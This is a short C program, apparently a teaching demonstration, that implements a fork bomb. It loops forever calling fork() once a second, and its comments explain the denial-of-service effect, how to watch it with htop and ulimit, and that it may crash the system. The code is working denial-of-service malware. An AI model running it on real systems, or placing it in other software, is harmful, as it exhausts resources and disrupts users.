#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

/**
 * A fork bomb is a malicious program that causes a denial-of-service (DoS) attack
 * by rapidly spawning child processes, eventually overwhelming the system.
 * In C, a fork bomb can be created using the fork() system call.
 *
 * You can run 'htop -p <PID>' or simply 'htop' to monitor resource usage and observe
 * how memory and CPU usage gradually increase until it reaches the limit set by the OS
 * To view the system process limits, run 'ulimit -a' or 'sudo -u <user> ulimit -a'
 */


// Warning: This program continuously spawns child processes, leading to a significant slowdown
// Caution: If the system process limits are not set, running this program may cause the system to crash
int main(void) {
        pid_t ppid = getpid();
        printf("PID: %d\n", ppid);

        while (1) {
                sleep(1);
                fork();
        }

        return 0;
}
